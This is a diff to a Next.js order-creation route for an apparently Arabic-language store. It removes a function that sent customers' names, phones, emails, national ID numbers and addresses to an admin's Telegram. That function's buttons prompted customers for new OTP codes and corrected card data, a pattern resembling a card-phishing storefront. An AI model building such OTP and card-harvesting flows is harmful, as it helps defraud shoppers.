@@ -1,10 +1,10 @@
 import { randomBytes } from 'node:crypto';
-import { ObjectId, type Db } from 'mongodb';
+import { ObjectId } from 'mongodb';
 import { NextRequest, NextResponse } from 'next/server';
 import { getDb } from '@/lib/mongodb';
 import { ensureDefaultProducts, findStoredProduct } from '@/lib/catalog';
 import { makeOrderNumber, type StoreOrder } from '@/lib/orders';
-import { ensureTelegramIndexes, sendTelegramMessage } from '@/lib/telegram';
+import { ensureTelegramIndexes } from '@/lib/telegram';
 
 export const runtime = 'nodejs';
 export const dynamic = 'force-dynamic';
@@ -47,85 +47,6 @@ function validEmail(value: string) {
 }
 
 const CUSTOMER_BROWSER_KEY_PATTERN = /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i;
-
-async function notifyAdminAboutNewOrder(db: Db, order: StoreOrder) {
-  const adminId = process.env.TELEGRAM_ADMIN_ID || process.env.Id || '';
-  if (!/^\d+$/.test(adminId)) return false;
-
-  const collection = db.collection<StoreOrder & {
-    telegramNotificationSent?: boolean;
-    telegramNotificationSendingAt?: Date;
-  }>('orders');
-  const now = new Date();
-  const claimed = await collection.updateOne(
-    {
-      _id: order._id,
-      telegramNotificationSent: { $ne: true },
-      $or: [
-        { telegramNotificationSendingAt: { $exists: false } },
-        { telegramNotificationSendingAt: { $lt: new Date(now.getTime() - 120_000) } }
-      ]
-    },
-    { $set: { telegramNotificationSendingAt: now } }
-  );
-
-  if (!claimed.modifiedCount) {
-    const latest = await collection.findOne({ _id: order._id });
-    return latest?.telegramNotificationSent === true;
-  }
-
-  const customer = order.customer || { name: '', phone: '', address: '' };
-  const itemLines = (order.items || []).slice(0, 20).map((item, index) =>
-    `${index + 1}. ${item.name} — الكمية: ${item.quantity}${item.color ? ' — اللون: ' + item.color : ''}${item.storage ? ' — التخزين: ' + item.storage : ''}`
-  );
-  const message = [
-    '🆕 طلب جديد وصل إلى المتجر',
-    `رقم الطلب: ${order.orderNumber}`,
-    `اسم العميل: ${customer.name || '—'}`,
-    `☎️ رقم الهاتف: ${customer.phone || (order as StoreOrder & { phone?: string }).phone || 'غير مسجل'}`,
-    `البريد الإلكتروني: ${customer.email || '—'}`,
-    `الهوية: ${customer.idNumber || '—'}`,
-    `العنوان: ${customer.address || '—'}`,
-    '',
-    'المنتجات:',
-    ...itemLines,
-    '',
-    `الإجمالي: ${Number(order.total || 0).toLocaleString('en-US')} ر.س`,
-    `التقسيط: ${order.installment ? 'نعم' : 'لا'}`,
-    '',
-    'افتح تفاصيل الطلب لمراجعته.'
-  ].join('\n');
-
-  try {
-    const orderId = order._id.toHexString();
-    await sendTelegramMessage(adminId, message, {
-      reply_markup: {
-        inline_keyboard: [
-          [{ text: '1️⃣ إظهار الفاتورة للعميل', callback_data: 'send-order-documents:' + orderId }],
-          [{ text: '❌ طلب رمز OTP جديد', callback_data: 'order-notice:' + orderId + ':otp' }],
-          [{ text: 'لا يوجد رصيد كافٍ', callback_data: 'order-notice:' + orderId + ':balance' }],
-          [{ text: 'بيانات البطاقة خاطئة', callback_data: 'order-notice:' + orderId + ':card' }],
-          [{ text: '6️⃣ ✅ طلب مكتمل', callback_data: 'status:' + orderId + ':completed' }]
-        ]
-      }
-    });
-    await collection.updateOne(
-      { _id: order._id },
-      {
-        $set: { telegramNotificationSent: true, telegramNotificationSentAt: new Date() },
-        $unset: { telegramNotificationSendingAt: '' }
-      }
-    );
-    return true;
-  } catch (error) {
-    await collection.updateOne(
-      { _id: order._id },
-      { $unset: { telegramNotificationSendingAt: '' } }
-    ).catch(() => undefined);
-    console.error('New order admin notification failed:', error instanceof Error ? error.message : 'Unknown error');
-    return false;
-  }
-}
 
 export async function GET(request: NextRequest) {
   const key = request.nextUrl.searchParams.get('key');
@@ -257,9 +178,7 @@ export async function POST(request: NextRequest) {
     const previous = await orders.findOne({ checkoutRequestId: submissionId });
     if (previous) {
       await orders.updateOne({ _id: previous._id }, { $set: { customerNotificationKey } });
-      const notificationSent = previous.telegramNotificationSent === true
-        ? true
-        : await notifyAdminAboutNewOrder(db, previous);
+      const notificationSent = previous.telegramNotificationSent === true;
       return NextResponse.json({
         ok: true,
         orderId: previous._id.toHexString(),
@@ -380,7 +299,7 @@ export async function POST(request: NextRequest) {
     };
 
     await orders.insertOne(order);
-    const notificationSent = await notifyAdminAboutNewOrder(db, order);
+    const notificationSent = false;
 
     return NextResponse.json({
       ok: true,
@@ -389,9 +308,7 @@ export async function POST(request: NextRequest) {
       total: order.total,
       currency: order.currency,
       notificationSent,
-      message: notificationSent
-        ? 'تم حفظ الطلب وإرساله إلى الإدارة للمراجعة.'
-        : 'تم حفظ الطلب، لكن تعذر إرسال إشعار الإدارة الآن. يمكنك المحاولة مرة أخرى.'
+      message: 'تم حفظ الطلب بنجاح.'
     }, { status: 201 });
   } catch (error) {
     console.error('Create order failed:', error instanceof Error ? error.message : 'Unknown error');
